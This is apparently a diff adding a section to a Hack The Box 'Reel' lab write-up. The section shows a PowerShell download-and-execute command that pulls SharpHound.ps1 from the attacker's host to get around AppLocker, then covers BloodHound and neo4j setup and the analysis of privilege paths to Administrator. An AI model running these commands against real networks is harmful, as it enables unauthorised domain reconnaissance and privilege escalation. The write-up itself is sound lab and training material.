@@ -206,5 +206,33 @@ On local client: impacket-smbserver share `pwd`
 On reel: net use Z: \\10.10.14.23\share
 ```
 
+The Bloodhound Ingestors on the box won't start because of AppLocker thats why I upload **SharpHound.ps1** from my client to the box:
+```powershell
+IEX(New-Object Net.WebClient).downloadString('http://10.10.14.23/SharpHound.ps1')
 
+Invoke-Bloodhound
+```
+
+This function in SharpHound will collect the information that we can ingest in BloodHound on our machine.
+Before starting BloodHound we need to start the **neo4j** database first:
+```markdown
+neo4j console
+
+Browse to: http://localhost:7474/
+Default password: neo4j
+Enter new password
+```
+
+After that we can start Bloodhound and login with the credentials we entered and we are in. Now we can drag the .zip file we generated with SharpHound into it.
+
+### Analyzing BloodHound
+
+We can see that _Tom_ and _Nico_ are group members of **Print Operators** and this group has a path to _Administrator_:
+
+![Shortest Paths to High Value Targets](https://kyuu-ji.github.io/htb-write-up/reel/Image1.png)
+
+This is no direct path, so we need to look for groups we care about and that BloodHound just doesn't know. If we look at the groups of the users we have manually, we see the group **Backup_Admins** that we need to query in BloodHound.
+```markdown
+net groups /domain
+```
 
